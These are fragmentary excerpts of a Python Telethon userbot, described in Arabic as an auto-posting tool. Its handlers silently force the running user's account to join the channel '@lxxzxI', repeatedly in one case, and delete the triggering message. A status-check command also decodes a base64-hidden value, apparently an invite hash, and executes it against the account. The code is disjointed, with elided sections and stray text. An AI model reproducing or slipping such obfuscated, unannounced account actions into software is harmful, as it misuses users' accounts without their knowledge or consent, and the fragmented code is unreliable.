...
async def join_channel(event):
	try :
		await ha313so(JoinChannelRequest('@lxxzxI'))
...
async def Hussein(event):
    ha313so = event.client
    joinu = await ha313so(JoinChannelRequest('lxxzxI'))
    joinu = await ha313so(JoinChannelRequest('lxxzxI'))
    joinu = await ha313so(JoinChannelRequest('lxxzxI'))
    await event.delete()
...
===== 𝖎𝖋𝖎 =====
    **"""
        await event.reply(file='https://telegra.ph/file/9c9d5d49b28c28fd25f1b.jpg', message=joker_313)
    elif event.pattern_match.group(1) == "فحص":
        hussein_ali = "**السورس يعمل بنجاح حبيبي ✅\nلعرض قائمة الاوامر أرسل `.الاوامر`**"
        await event.reply(file='https://telegra.ph/file/9c9d5d49b28c28fd25f1b.jpg', message=hussein_ali)
        joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
        joker = Get(joker)
        try:
            await event.client(joker)
            ...
            pass
print('تم تشغيل نشر التلقائي سورس النشر التلقائي ')
